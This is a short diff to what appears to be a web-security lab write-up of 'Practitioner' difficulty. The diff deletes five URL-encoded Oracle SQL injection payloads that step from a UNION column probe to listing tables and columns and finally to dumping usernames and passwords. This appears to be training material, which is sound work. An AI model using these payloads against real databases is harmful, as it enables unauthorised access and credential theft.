@@ -1,8 +1,4 @@
-`'+UNION+SELECT+NULL,NULL+FROM+DUAL--`
-`'+UNION+SELECT+'a','b'+FROM+DUAL--`
-`'+UNION+SELECT+table_name,NULL+FROM+all_tables-- `
-`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_yourstring'--`
-`'+UNION+SELECT+USERNAME_yourstring,PASSWORD_yourstring+FROM+USERS_yourstring--`
+
 ## Metadata
 
 - **Difficulty:** Practitioner 
